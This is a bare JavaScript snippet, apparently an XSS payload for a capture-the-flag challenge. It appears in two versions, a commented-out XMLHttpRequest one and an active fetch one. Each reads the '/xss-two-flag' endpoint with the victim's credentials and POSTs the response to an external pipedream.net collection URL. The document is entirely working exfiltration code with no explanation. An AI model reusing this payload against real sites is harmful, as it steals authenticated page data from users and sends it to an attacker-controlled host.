//var xhr = new XMLHttpRequest(); xhr.open('GET', '/xss-two-flag', true); xhr.onreadystatechange = function() { if (xhr.readyState == 4 && xhr.status == 200) { var flag = xhr.responseText; var xhr2 = new XMLHttpRequest(); xhr2.open('POST', 'https://eom4efcrby0i38q.m.pipedream.net', true); xhr2.setRequestHeader('Content-Type', 'application/json'); xhr2.send(JSON.stringify({flag: flag})); } }; xhr.send();

fetch('/xss-two-flag', {
  credentials: 'include'
})
.then(response => response.text())
.then(flag => {
  fetch('https://eom4efcrby0i38q.m.pipedream.net', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ flag: flag })
  });
});
